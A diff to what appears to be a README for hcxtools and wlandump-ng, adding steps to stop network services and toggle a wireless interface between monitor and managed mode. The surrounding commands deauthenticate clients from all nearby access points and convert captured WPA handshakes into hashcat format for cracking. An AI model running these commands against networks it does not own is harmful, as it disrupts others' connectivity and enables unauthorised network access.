@@ -65,12 +65,38 @@ cd hcxtools
 make
 sudo make install
 
+# you must identify all services that takes access to your capture device and stop them (at least this 2):
+sudo systemctl stop NetworkManager.service
+sudo systemctl stop wpa_supplicant.service
+
+# you must put the interface into monitor mode (where $WLANDEV is your device name)
+# do not use wlandump-ng/wlanresponse on virtual devices like monx, or use airmon-ng to put the device into monitor mode
+sudo ip link set $WLANDEV down
+sudo iw dev $WLANDEV set type monitor
+sudo ip link set $WLANDEV up
+sudo iw dev $WLANDEV info
+
 # blanket death connected clients from all nearby access points and listen for re-connections
 # replace wlan0 with your wireless device name
 wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 
 
+# if you got pcap read errors like this:
+# internal pcap errors.....................................: 12
+# there are more services that prevent wlandump-ng/wlanresponse to access the device - you must identify and stop them
+
+
 # once you've got a capture file, you can convert it to the hashcat capture format with
 cap2hccapx.bin capture.cap capture.hccapx
+
+# if you finished capturing do not forget to put the device back into managed mode
+sudo ip link set $WLANDEV down
+sudo iw dev $WLANDEV set type managed
+sudo ip link set $WLANDEV up
+sudo iw dev $WLANDEV info
+
+# and start the services again - otherwise you will have no connectivity!
+sudo systemctl start NetworkManager.service
+sudo systemctl start wpa_supplicant.service
 ```
 
 `wlandump-ng` command-line args (use `-h` flag for full list):
